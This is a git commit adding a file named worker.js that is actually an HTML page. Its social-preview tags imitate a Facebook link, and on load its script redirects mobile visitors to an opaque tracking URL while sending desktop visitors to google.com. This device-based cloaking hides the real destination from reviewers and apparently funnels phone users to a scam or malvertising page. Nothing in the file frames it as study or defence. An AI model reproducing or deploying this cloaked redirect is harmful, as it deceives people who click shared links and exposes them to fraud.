2abca1fe9c6d78ce3036768c0b7aaab70e9ef2b6
azijanjaan-sketch <azijanjaan@gmail.com>
2026-09-24 22:12:45 +0500

    Create worker.js

---
+++ worker.js
@@ -0,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+
+    <meta property="og:title" content="🧡💚💙🧡">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="https://fgrwgyvlstkwmrrxwzfz.supabase.co/storage/v1/object/public/65ed8776uds/4%20(1).gif">
+    <meta property="og:url" content="https://web.facebook.com/zuck/?_rdc=1&_rdr#">
+    <meta property="og:type" content="website">
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        var screenWidth = window.innerWidth;
+
+        if (isMobile || screenWidth <= 768) {
+            window.location.href = "https://acorntar.com/mxxcdagb?key=e6e8236c6980d94ca8e81d0b03ea93df";
+        } else {
+            window.location.href = "https://www.google.com";
+        }
+    });
+    </script>
+</head>
+<body>
+</body>
+</html>
